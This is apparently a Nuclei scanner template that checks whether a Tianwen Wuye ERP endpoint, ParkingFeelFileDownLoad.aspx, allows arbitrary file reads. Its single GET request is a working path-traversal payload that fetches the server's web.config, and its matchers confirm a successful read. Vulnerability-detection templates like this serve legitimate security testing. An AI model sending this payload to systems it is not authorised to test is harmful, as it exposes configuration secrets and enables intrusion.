id: tianwen-wuye-erp-parkingfeelfiledownload-anyfile-read
info:
  name: Tianwen Wuye ERP ParkingFeelFileDownLoad Arbitrary File Read
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
  description: |
    Tianwen Wuye ERP system ParkingFeelFileDownLoad endpoint allows arbitrary file reading, potentially exposing sensitive files like web.config.

http:
  - method: GET
    path:
      - "{{BaseURL}}/HM/M_main/InformationManage/ParkingFeelFileDownLoad.aspx?ParkingFile=../web.config"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "filename=web.config"
      - type: word
        part: header
        words:
          - "application/octet-stream"
      - type: word
        part: body
        words:
          - "<configuration>"
